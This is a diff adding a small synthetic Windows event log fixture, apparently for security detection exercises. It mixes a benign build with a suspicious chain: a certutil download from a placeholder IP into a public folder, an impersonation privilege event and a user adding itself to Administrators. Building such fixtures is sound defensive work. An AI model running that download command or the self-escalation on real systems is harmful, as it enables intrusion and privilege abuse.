@@ -1,0 +1,6 @@
+# SYNTHETIC FIXTURE - not real security data. New Week 2 synthetic fixture: Windows 4688/4672/4732 mix (one benign build action, one suspicious download utility use).
+2026-10-15 10:02:11 WS-DEV-02 EventID=4688 Account=CORP\dev1 NewProcessName=C:\Windows\System32\cmd.exe ParentProcessName=C:\Windows\explorer.exe CommandLine="cmd.exe /c whoami"
+2026-10-15 10:02:40 WS-DEV-02 EventID=4688 Account=CORP\dev1 NewProcessName=C:\Program Files\BuildTools\msbuild.exe ParentProcessName=C:\Windows\System32\cmd.exe CommandLine="msbuild.exe app.sln /t:Build"
+2026-10-15 10:04:05 WS-DEV-02 EventID=4688 Account=CORP\dev1 NewProcessName=C:\Windows\System32\certutil.exe ParentProcessName=C:\Windows\System32\cmd.exe CommandLine="certutil.exe -urlcache -split -f http://198.51.100.23/a.txt C:\Users\Public\a.txt"
+2026-10-15 10:04:30 WS-DEV-02 EventID=4672 Account=CORP\dev1 Privileges=SeImpersonatePrivilege
+2026-10-15 10:05:12 WS-DEV-02 EventID=4732 MemberAdded=dev1 Group=Administrators ChangedBy=dev1
